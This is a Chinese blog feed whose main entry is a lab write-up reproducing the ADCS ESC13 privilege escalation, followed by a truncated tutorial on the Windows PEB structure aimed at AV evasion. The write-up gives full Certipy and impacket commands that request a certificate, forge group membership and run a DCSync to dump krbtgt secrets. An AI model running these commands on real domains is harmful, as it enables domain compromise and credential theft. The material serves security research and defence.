<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>滥用ADCS进行权限提升——ESC13详解</title>
      <link href="/post/48e6280e.html"/>
      <url>/post/48e6280e.html</url>
      
        <content type="html"><![CDATA[<p>本文首发于先知社区：<a href="https://xz.aliyun.com/t/13864">https://xz.aliyun.com/t/13864</a></p><h2 id="0x1-起因："><a href="#0x1-起因：" class="headerlink" title="0x1 起因："></a>0x1 起因：</h2><p>​       自 Will Schroeder（<a href="https://twitter.com/harmj0y">@harmj0y</a>）和 Lee Christensen（<a href="https://twitter.com/tifkin_">@tifkin_</a>）在 2021 年的 BlackHat 大会上发布白皮书以来，ADCS的攻击面首次系统化的进入人们的视野。<a href="https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf">Certified Pre-Owned - Abusing Active Directory Certificate Services</a>这本白皮书可以说是为ADCS的利用奠定了各种理论基础。<br>​       随着ADCS的利用越加广泛，各种工具层出不穷，其中Certipy更是其中的佼佼者，近日在学习Certipy的相关代码实现的时候，偶然发现了这样一条PR</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/25946722/1708914927187-82296929-cb7d-40c9-9870-679ed15f5df5.png#averageHue=%2312171e&clientId=u45251239-0d4a-4&from=paste&height=393&id=uc7a279be&originHeight=589&originWidth=1853&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=79883&status=done&style=none&taskId=uf22aa9a9-573c-4abd-8216-4280825c7a3&title=&width=1235.3333333333333" alt="image.png"><br>众所周知（应该），在白皮书中一共介绍了ESC1-ESC8这8种ESC命名的攻击手法，后续又补充了<a href="https://medium.com/u/cd3a881c1abc?source=post_page-----fda4272fbd53--------------------------------">Oliver Lyak</a>提出的<a href="https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7">ESC9和ESC10</a>、 <a href="https://twitter.com/sploutchy">Sylvain Heiniger</a>提出的中继到RPC的 <a href="https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/">ESC11</a>和利用条件比较局限的的<a href="https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm">ESC12</a>，针对这条PR附带的<a href="https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53">博客文章</a>，我尝试对这个ESC13进行分析和复现。</p><h2 id="0x2-分析："><a href="#0x2-分析：" class="headerlink" title="0x2 分析："></a>0x2 分析：</h2><p>​       首先，先上结论：正如标题，这不是一个可以和ESC1或者ESC8一样可以直接获取域内权限的致命漏洞，它只能算是一个域内权限提升漏洞，提升的权限取决于你错误配置指向的组的权限，且它的限制颇多。<br>   说的详细一点的话就是，我们可以使用指向给定 AD 组的 OID 组链接的颁发策略来配置证书模板。当我们用这个模板申请证书成功之后，我们利用该证书进行身份验证就可以获取这个组的权限，哪怕我们的用户不在这个组里。</p><p>这里面涉及到三个关键：</p><ul><li>颁发策略</li><li>指向AD组的OID组链接</li><li>使用证书认证</li></ul><p>我们对此进行逐步分析</p><h3 id="证书颁发策略"><a href="#证书颁发策略" class="headerlink" title="证书颁发策略"></a>证书颁发策略</h3><p>证书颁发策略是指用于控制证书颁发的一组规则和条件。颁发策略定义了在何种情况下、以何种方式以及向谁颁发证书。<br>我们可以打开一个证书模板查看其拓展，可以看到是包括了颁发策略这一部分的，而且当前模板默认是没有值<br><img src="https://cdn.nlark.com/yuque/0/2024/png/25946722/1708918016197-6a505c5b-2cd3-43a5-8df3-75eeaa1086e7.png#averageHue=%23f8f7f6&clientId=u230a819b-e668-4&from=paste&height=385&id=u18b7d027&originHeight=577&originWidth=915&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=73074&status=done&style=none&taskId=uaa9ddf63-788c-48d2-8836-749b662b67b&title=&width=610" alt="image.png"><br>我们可以点击编辑添加颁发策略，也可以新建我们自己的颁发策略<br><img src="https://cdn.nlark.com/yuque/0/2024/png/25946722/1708918078789-58e43ae4-20a1-4eec-a40b-2ccaa9c1c7da.png#averageHue=%23f2f2f1&clientId=u230a819b-e668-4&from=paste&height=323&id=ue8e1c19d&originHeight=484&originWidth=752&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=34866&status=done&style=none&taskId=ucc9890b9-3087-4752-8c27-2c9adeac44b&title=&width=501.3333333333333" alt="image.png"><br>证书的颁发策略同样是用OID进行标志的，它存储在LDAP中的CN&#x3D;OID,CN&#x3D;Public Key Services,CN&#x3D;Services,CN&#x3D;Configuration,DC&#x3D;esg-red,DC&#x3D;local中，每一个CN代表一个OID对象<br><img src="https://cdn.nlark.com/yuque/0/2024/png/25946722/1708918442888-84c364a8-d563-42ac-84e4-8e5ffaca90e4.png#averageHue=%23f8f7f6&clientId=u230a819b-e668-4&from=paste&height=465&id=u66ac5de5&originHeight=697&originWidth=1240&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=97131&status=done&style=none&taskId=ub9f1220c-95fd-41ea-b478-d98d6a54b3e&title=&width=826.6666666666666" alt="image.png"><br>同样我们也可以通过powershell来查看</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADObject</span> <span class="literal">-Filter</span> * <span class="literal">-SearchBase</span> <span class="string">&quot;CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=esg-red,DC=local&quot;</span> <span class="literal">-Properties</span> DisplayName,msPKI<span class="literal">-Cert-Template-OID</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/25946722/1708919300339-9f5a206b-b6ea-4900-a88f-8e35e408f4f7.png#averageHue=%23012456&clientId=u230a819b-e668-4&from=paste&height=553&id=u02de8495&originHeight=829&originWidth=1377&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=52356&status=done&style=none&taskId=u4841601f-7d15-4020-8aa6-b12711fd6ff&title=&width=918" alt="image.png"><br>注意，上面存储的OID是ADCS中所有的OID，而证书模板具有的颁发策略的OID则存储在证书模板中的msPKI-Certificate-Policy属性中<br><img src="https://cdn.nlark.com/yuque/0/2024/png/25946722/1708919336264-7ebd03a1-f56d-448c-9f27-8d9b598126c6.png#averageHue=%23f3f2f1&clientId=u230a819b-e668-4&from=paste&height=413&id=u41f2738e&originHeight=620&originWidth=1248&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=98683&status=done&style=none&taskId=u38f946fc-5a2c-4e07-a6c3-68728d5223f&title=&width=832" alt="image.png"></p><h3 id="OID组链接"><a href="#OID组链接" class="headerlink" title="OID组链接"></a>OID组链接</h3><p>对应CN&#x3D;OID这个容器，我们可以看到它是一个<code>msPKI-Enterprise-Oid</code>类，而对于这个类，它存在一个继承 的<code>msDS-OIDToGroupLink</code>属性<br><img src="https://cdn.nlark.com/yuque/0/2024/png/25946722/1708919491225-4d2d4819-10d8-47bc-a262-61e48acefbdf.png#averageHue=%23f0eeed&clientId=u230a819b-e668-4&from=paste&height=290&id=u5dd9b8b7&originHeight=435&originWidth=853&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=55336&status=done&style=none&taskId=u98c04447-7256-4952-823f-221391a5c14&title=&width=568.6666666666666" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2024/png/25946722/1708919746008-72eee16a-bdb6-458e-8425-83ef1852a64e.png#averageHue=%23f5f4f2&clientId=u230a819b-e668-4&from=paste&height=511&id=uafe70662&originHeight=766&originWidth=1362&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=136993&status=done&style=none&taskId=ubfbd46d1-8d5d-4793-b4fe-63a7b7524ab&title=&width=908" alt="image.png"><br><code>msDS-OIDToGroupLink</code>这个属性便是ESC13的关键，它标识了与该 OID 表示的发布策略对应的组对象。换句话说，我们可以利用这个属性将我们的颁发策略和相应的AD组链接起来，如果用户利用带有相关颁发策略的证书进行身份验证，那么系统将认为该用户作为AD组的成员（用户不在该组中），并授予相应的权限。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/25946722/1708926380028-d7fc811f-edbf-431f-8465-5f682b28e6ff.png#averageHue=%23f9f8f6&clientId=u230a819b-e668-4&from=paste&height=508&id=ua9b6c4e3&originHeight=762&originWidth=1495&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=116127&status=done&style=none&taskId=u4b2539be-8d66-45c6-839a-9a5cbefead8&title=&width=996.6666666666666" alt="image.png"><br>但是并不是任何组都可以被颁发策略链接的，它需要满足以下要求</p><ol><li>必须是AD的通用组</li><li>组内没有任何成员</li></ol><p>当我们设置了<code>msDS-OIDToGroupLink</code>属性后，尝试向这个组内添加成员会报错<br><img src="https://cdn.nlark.com/yuque/0/2024/png/25946722/1708926550502-f84963fc-be61-4d20-bff4-73621f708f5a.png#averageHue=%23f9f9f8&clientId=u230a819b-e668-4&from=paste&height=199&id=u52d5d50c&originHeight=298&originWidth=713&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=8675&status=done&style=none&taskId=ub7509b79-0fb6-4d98-baaf-d9521e7e2c8&title=&width=475.3333333333333" alt="image.png"></p><h3 id="证书认证："><a href="#证书认证：" class="headerlink" title="证书认证："></a>证书认证：</h3><p>前面说到，这是利用证书颁发策略的<code>msDS-OIDToGroupLink</code>属性导致的权限滥用，所以我们必须要使用证书进行身份验证才行，也就是说我们的证书模板要支持证书认证。<br>我们可以验证一下，我们为ESCUser13用户申请具有漏洞的ESC13模板证书，我们利用Rubeus申请TGT票据，并利用krbtgt的密钥解密查看PAC部分<br><img src="https://cdn.nlark.com/yuque/0/2024/png/25946722/1708927396119-5839c1ab-91e2-459f-a220-eb8b196a2044.png#averageHue=%23161616&clientId=u230a819b-e668-4&from=paste&height=446&id=u2fdade49&originHeight=669&originWidth=1722&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=64918&status=done&style=none&taskId=uc2e78c56-c46c-4eec-984b-b45ecb469ff&title=&width=1148" alt="image.png"><br>我们可以看到ESC13User除了默认的513User组外，没有加入任何其他组<br><img src="https://cdn.nlark.com/yuque/0/2024/png/25946722/1708927501328-ed74ff2d-6af2-4021-bcdf-9a62b0c57cb7.png#averageHue=%230a2c5c&clientId=u230a819b-e668-4&from=paste&height=149&id=ud44fac20&originHeight=223&originWidth=643&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=7801&status=done&style=none&taskId=u84af355c-fc10-4ad4-9ecf-bddb882e95f&title=&width=428.6666666666667" alt="image.png"><br>但是在我们查看票据的PAC的时候，可以看到它拥有着ESC13Group这个组的权限<br><img src="https://cdn.nlark.com/yuque/0/2024/png/25946722/1708927428326-cccdbc5c-b312-4857-a0c0-06c57b6b09ac.png#averageHue=%23101010&clientId=u230a819b-e668-4&from=paste&height=545&id=u592a5e9e&originHeight=817&originWidth=1106&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=25041&status=done&style=none&taskId=u8426d23a-c5d9-4c04-be1e-e5a46b4c74d&title=&width=737.3333333333334" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/25946722/1708927549008-cb2c31c4-f35c-4700-9597-5e071f82d9aa.png#averageHue=%23f6f5f4&clientId=u230a819b-e668-4&from=paste&height=447&id=u95811611&originHeight=671&originWidth=1010&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=104050&status=done&style=none&taskId=ued2b311e-90a2-4b2e-b849-953c640204d&title=&width=673.3333333333334" alt="image.png"><br>而我们利用正常账号密码申请票据，发现只有一个513User组<br><img src="https://cdn.nlark.com/yuque/0/2024/png/25946722/1708927608876-3757adff-588b-4887-a435-91ef37bd7801.png#averageHue=%23151515&clientId=u230a819b-e668-4&from=paste&height=449&id=u727c9d63&originHeight=674&originWidth=1542&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=64381&status=done&style=none&taskId=u2f25f66e-fbb7-420b-b916-b2c6a899d3c&title=&width=1028" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/25946722/1708927638298-2e4817d8-b3f2-4779-8963-950d48c86871.png#averageHue=%23101010&clientId=u230a819b-e668-4&from=paste&height=507&id=ua756cd20&originHeight=761&originWidth=1059&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=22607&status=done&style=none&taskId=u3135fc9b-52d2-433c-98cf-7c9ea2b9729&title=&width=706" alt="image.png"></p><h2 id="0x3-漏洞复现："><a href="#0x3-漏洞复现：" class="headerlink" title="0x3 漏洞复现："></a>0x3 漏洞复现：</h2><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>搭建域控和ADCS的步骤这里不再赘述了<br>域控：DC Windows server 2019 Datacenter 10.10.10.128<br>ADCS：ADCS Windows server 2019 Datacenter 10.10.10.131<br>域名：esg-red.local<br>CA名：esg-red-ADCS-CA<br>首先我们新建一个普通用户，确保它没有加入任何其他组</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADUser</span> ESC13User <span class="literal">-Properties</span> MemberOf</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/25946722/1708928161501-eb3f13d2-7784-4499-bcaa-12428718e751.png#averageHue=%230b2c5c&clientId=u230a819b-e668-4&from=paste&height=143&id=uc6cb32a2&originHeight=214&originWidth=633&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=6619&status=done&style=none&taskId=u1357ab96-d4ee-47d2-acc0-3bed9341782&title=&width=422" alt="image.png"><br>然后创建一个通用组，组内没有任何用户<br><img src="https://cdn.nlark.com/yuque/0/2024/png/25946722/1708928218262-fc69a70a-e671-459d-a346-455b72159b46.png#averageHue=%23f2f0ee&clientId=u230a819b-e668-4&from=paste&height=424&id=u515d51f3&originHeight=636&originWidth=857&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=105988&status=done&style=none&taskId=udbe6c567-ca7a-47d9-962f-c3f6a0d867c&title=&width=571.3333333333334" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/25946722/1708928234061-d40b41da-a944-4d9e-896c-ba87b20a82f6.png#averageHue=%23efefee&clientId=u230a819b-e668-4&from=paste&height=273&id=u033e9812&originHeight=410&originWidth=540&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=21248&status=done&style=none&taskId=u34b208cf-3176-4030-b02f-039bd0353cd&title=&width=360" alt="image.png"><br>为了验证权限，我们为这个组设置对域内DCSync的权限<br><img src="https://cdn.nlark.com/yuque/0/2024/png/25946722/1708939042023-6d4bcd88-ace1-48eb-9858-adef0975f270.png#averageHue=%23f5f3f1&clientId=u54327113-d12a-4&from=paste&height=268&id=u6ea25eb4&originHeight=402&originWidth=444&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=28409&status=done&style=none&taskId=u225c02be-e7f1-43f3-8c57-5656257a9f6&title=&width=296" alt="image.png"><br>接着我们来到我们的ADCS，在终端中输入<code>certsrv.msc</code>打开我们的证书颁发机构，在证书模板这里右键管理打开证书模板控制台，我们可以直接复制现有的模板来创建新的漏洞模板。我们右键工作组身份验证选择复制模板，修改模板名称，在拓展这里双击颁发策略，点击添加<br><img src="https://cdn.nlark.com/yuque/0/2024/png/25946722/1708928861889-4606c86b-1bbd-42ba-97f6-b6cdfa20d6db.png#averageHue=%23f0f0ef&clientId=u230a819b-e668-4&from=paste&height=372&id=u61fdae3c&originHeight=558&originWidth=558&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=36528&status=done&style=none&taskId=uf2f33612-de83-43de-88aa-808eb49c4ab&title=&width=372" alt="image.png"><br>我们可以选择现有的颁发策略，也可以直接新建颁发策略，新建时填写名称就行了<br><img src="https://cdn.nlark.com/yuque/0/2024/png/25946722/1708928921174-ee039622-f217-4b23-9e61-9fe16c88e59e.png#averageHue=%23f1efee&clientId=u230a819b-e668-4&from=paste&height=313&id=ua2093655&originHeight=470&originWidth=880&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=50738&status=done&style=none&taskId=ub0691b52-b435-49c1-983f-434f323bc31&title=&width=586.6666666666666" alt="image.png"><br>在填完完成之后，点击拓展里的颁发策略，下面会显示已有的策略<br><img src="https://cdn.nlark.com/yuque/0/2024/png/25946722/1708928983194-ff9ed238-b996-4d5a-b66e-daae66536fed.png#averageHue=%23fbfafa&clientId=u230a819b-e668-4&from=paste&height=235&id=u0a3e6489&originHeight=352&originWidth=442&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=12979&status=done&style=none&taskId=u8d624044-f5d6-4d06-b6b8-5f35ec9b5a2&title=&width=294.6666666666667" alt="image.png"><br>我们需要给予用户对证书的申请权限<br><img src="https://cdn.nlark.com/yuque/0/2024/png/25946722/1708929289096-602c22a6-b7d1-41e5-a7a1-f4a79c6ea493.png#averageHue=%23f7f6f5&clientId=u230a819b-e668-4&from=paste&height=423&id=ub6ec8b3c&originHeight=634&originWidth=455&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=32160&status=done&style=none&taskId=ub5c96577-e789-4d3f-8ccd-84f11b93e92&title=&width=303.3333333333333" alt="image.png"><br>同时还有一个非常重要的一点，我们需要在使用者名称这里，将DNS名修改为用户主体名称(UPN)，因为我们新建的用户是没有dNSHostName这个属性的，不更改的话会导致证书申请失败<br><img src="https://cdn.nlark.com/yuque/0/2024/png/25946722/1708929219915-390945d9-f0ad-43d1-807b-d1cb225d8d51.png#averageHue=%23ebeae9&clientId=u230a819b-e668-4&from=paste&height=355&id=u9c926504&originHeight=533&originWidth=439&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=31879&status=done&style=none&taskId=u0bb5d110-bcd2-47d1-860c-8c13d0945b3&title=&width=292.6666666666667" alt="image.png"><br>我们在终端中输入<code>adsiedit.msc</code>打开ADSI编辑器，然后连接AD的Configuration<br><img src="https://cdn.nlark.com/yuque/0/2024/png/25946722/1708928392356-0b01c427-706e-4ea5-890d-87b54c77794e.png#averageHue=%23f9f8f8&clientId=u230a819b-e668-4&from=paste&height=463&id=uc2b17dfb&originHeight=694&originWidth=1129&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=45598&status=done&style=none&taskId=u62555f8a-69c7-403e-a189-166fbb4bd95&title=&width=752.6666666666666" alt="image.png"><br>找到我们的OID容器，在<code>CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=esg-red,DC=local</code>下，找到我们创建的颁发策略，修改其<code>msDS-OIDToGroupLink</code>属性为我们创建的通用组<br><img src="https://cdn.nlark.com/yuque/0/2024/png/25946722/1708928566245-84c4753e-707b-454d-a148-12ae106c2b82.png#averageHue=%23f4f2f0&clientId=u230a819b-e668-4&from=paste&height=427&id=u9520fa4e&originHeight=641&originWidth=955&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=90125&status=done&style=none&taskId=uf0202ba1-d05f-473a-83cd-770b28fc4d5&title=&width=636.6666666666666" alt="image.png"></p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>我们找到支持ESC13的<a href="https://github.com/sploutchy/Certipy/tree/main">分支</a>下载下来，进入主目录，利用find进行简单的信息收集<br>可以看到，成功的扫描出了ESC13这个漏洞<br><img src="https://cdn.nlark.com/yuque/0/2024/png/25946722/1708929665639-a7fc218a-4798-4c0a-abb5-04657d27a15d.png#averageHue=%232c2e38&clientId=u230a819b-e668-4&from=paste&height=444&id=ubdd963a8&originHeight=666&originWidth=1450&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=188814&status=done&style=none&taskId=u5ea93e5d-a11a-4ad6-a072-52b5b0d559e&title=&width=966.6666666666666" alt="image.png"><br>然后我们申请pfx证书</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python entry.py req <span class="literal">-u</span> <span class="string">&#x27;ESC13User@esg-red.local&#x27;</span> <span class="literal">-p</span> <span class="string">&#x27;Admin13&#x27;</span> <span class="literal">-template</span> <span class="string">&#x27;ESC13&#x27;</span>  <span class="literal">-target</span> adcs.esg<span class="literal">-red</span>.local  <span class="literal">-ca</span> esg<span class="literal">-red-ADCS-CA</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/25946722/1708929770957-314ef791-2c51-461f-9e3b-4e1f1b86225b.png#averageHue=%23292b35&clientId=u230a819b-e668-4&from=paste&height=191&id=ufd57e4a9&originHeight=286&originWidth=1644&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=74467&status=done&style=none&taskId=u8eaf06c3-9ea2-48ef-a91a-2d189d53275&title=&width=1096" alt="image.png"><br>我们利用申请的证书使用申请kirbi类型的票据并将其转化为Linux上使用的ccache类型</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python entry.py auth <span class="literal">-pfx</span> esc13user.pfx <span class="literal">-dc-ip</span> <span class="number">10.10</span>.<span class="number">10.128</span> <span class="literal">-kirbi</span></span><br><span class="line">impacket<span class="literal">-ticketConverter</span> esc13user.kirbi esc13user.ccache</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/25946722/1708939385399-fb4b4920-46ff-4e79-bcb2-39c13f9a0ef4.png#averageHue=%232b2d37&clientId=u54327113-d12a-4&from=paste&height=311&id=ua1ef076f&originHeight=467&originWidth=1299&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=98957&status=done&style=none&taskId=ua27dd07b-2a42-430b-814c-cd16797552a&title=&width=866" alt="image.png"><br>我们利用impacket分支的<a href="https://github.com/ThePorgs/impacket/blob/7a0ec36036b9b3339a7a72290f33c243a5e4f0b9/examples/describeTicket.py#L4">describeTicket.py</a>脚本解密查看，可以看到确实是存在2616这个组的权限</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python aaa.py esc13user.ccache <span class="literal">--aes</span> <span class="number">3</span>c4f06f1b46e0d5d30fe428ce08921964cae205def01fcf3b643dacf40a27983</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/25946722/1708939562089-5c4c3e23-d5ee-4173-80e8-889526247687.png#averageHue=%232b2e37&clientId=u54327113-d12a-4&from=paste&height=311&id=u65aaacfe&originHeight=467&originWidth=853&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=88306&status=done&style=none&taskId=u340213bb-4ae4-448c-a60e-c5805a8181b&title=&width=568.6666666666666" alt="image.png"><br>导入票据</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=esc13user.ccache</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/25946722/1708939595985-de6e2e2e-db72-429a-b3fe-4741ac6638d6.png#averageHue=%232d2f39&clientId=u54327113-d12a-4&from=paste&height=211&id=u289cc822&originHeight=316&originWidth=948&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=56631&status=done&style=none&taskId=uda6421e1-922e-4735-8c80-ea6ef2050b2&title=&width=632" alt="image.png"><br>尝试DCSync攻击</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket<span class="literal">-secretsdump</span> esg<span class="literal">-red</span>.local/ESC13User@DC.esg<span class="literal">-red</span>.local  <span class="literal">-k</span> <span class="literal">-no-pass</span> <span class="literal">-just-dc-user</span> <span class="string">&#x27;krbtgt&#x27;</span> <span class="literal">-debug</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/25946722/1708939699045-942d1018-3918-4f21-b05e-77f7aa54852c.png#averageHue=%232d2f39&clientId=u54327113-d12a-4&from=paste&height=496&id=u9d5969be&originHeight=744&originWidth=1469&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=226821&status=done&style=none&taskId=u2de54266-3298-45bc-bea7-be90de2aa25&title=&width=979.3333333333334" alt="image.png"></p><h2 id="0x4-总结："><a href="#0x4-总结：" class="headerlink" title="0x4 总结："></a>0x4 总结：</h2><p>感觉这个利用属于是”可遇而不可求“，感觉利用限制很多，而且获取的还不一定是高权限组的权限，不过我们可以配合其他漏洞，例如ESC5来修改PKI的ACL等。本篇文章只是暂时分析了一下成因及其简单利用，后续有其他利用姿势欢迎大佬补充，文章有什么错误也欢迎大佬斧正。</p>]]></content>
      
      
      <categories>
          
          <category> AD域 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ADCS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解析PEB</title>
      <link href="/post/db27253d.html"/>
      <url>/post/db27253d.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>学习syscall和免杀绕不开PEB这个部分，我们要对相关结构熟悉，既要会手动解析，也能利用代码解析。</p><h3 id="PEB结构："><a href="#PEB结构：" class="headerlink" title="PEB结构："></a>PEB结构：</h3><p>经典大图，永不过时：</p><img src="/post/db27253d/1678437013915-a86d3186-b781-47d0-b4a0-8df5788b0485.png" class=""><p>注：PEB的结构微软并未完全公开，以上图片可以参考但不一定权威</p><p>如果你对偏移比较熟悉的话可以直接用指针+偏移找，不需要特地定义结构体，而且双向链表<code>_LIST_ENTRY</code>这个是公开的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> &#123;</span><br><span class="line">   <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> *Flink;</span><br><span class="line">   <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> *Blink;</span><br><span class="line">&#125; LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;</span><br></pre></td></tr></table></figure><p><strong>自定义PEB的结构</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PEB</span> &#123;</span><br><span class="line">    BOOLEAN InheritedAddressSpace;</span><br><span class="line">    BOOLEAN ReadImageFileExecOptions;</span><br><span class="line">    BOOLEAN BeingDebugged;</span><br><span class="line">    BOOLEAN Spare;</span><br><span class="line">    HANDLE Mutant;</span><br><span class="line">    PVOID ImageBase;</span><br><span class="line">    PPEB_LDR_DATA LoaderData;<span class="comment">// 0x0c </span></span><br><span class="line">    PVOID ProcessParameters;</span><br><span class="line">    PVOID SubSystemData;</span><br><span class="line">    PVOID ProcessHeap;</span><br><span class="line">    PVOID FastPebLock;</span><br><span class="line">    PVOID FastPebLockRoutine;</span><br><span class="line">    PVOID FastPebUnlockRoutine;</span><br><span class="line">    ULONG EnvironmentUpdateCount;</span><br><span class="line">    PVOID* KernelCallbackTable;</span><br><span class="line">    PVOID EventLogSection;</span><br><span class="line">    PVOID EventLog;</span><br><span class="line">    PVOID FreeList;</span><br><span class="line">    ULONG TlsExpansionCounter;</span><br><span class="line">    PVOID TlsBitmap;</span><br><span class="line">    ULONG TlsBitmapBits[<span class="number">0x2</span>];</span><br><span class="line">    PVOID ReadOnlySharedMemoryBase;</span><br><span class="line">    PVOID ReadOnlySharedMemoryHeap;</span><br><span class="line">    PVOID* ReadOnlyStaticServerData;</span><br><span class="line">    PVOID AnsiCodePageData;</span><br><span class="line">    PVOID OemCodePageData;</span><br><span class="line">    PVOID UnicodeCaseTableData;</span><br><span class="line">    ULONG NumberOfProcessors;</span><br><span class="line">    ULONG NtGlobalFlag;</span><br><span class="line">    BYTE Spare2[<span class="number">0x4</span>];</span><br><span class="line">    LARGE_INTEGER CriticalSectionTimeout;</span><br><span class="line">    ULONG HeapSegmentReserve;</span><br><span class="line">    ULONG HeapSegmentCommit;</span><br><span class="line">    ULONG HeapDeCommitTotalFreeThreshold;</span><br><span class="line">    ULONG HeapDeCommitFreeBlockThreshold;</span><br><span class="line">    ULONG NumberOfHeaps;</span><br><span class="line">    ULONG MaximumNumberOfHeaps;</span><br><span class="line">    PVOID** ProcessHeaps;</span><br><span class="line">    PVOID GdiSharedHandleTable;</span><br><span class="line">    PVOID ProcessStarterHelper;</span><br><span class="line">    PVOID GdiDCAttributeList;</span><br><span class="line">    PVOID LoaderLock;</span><br><span class="line">    ULONG OSMajorVersion;</span><br><span class="line">    ULONG OSMinorVersion;</span><br><span class="line">    ULONG 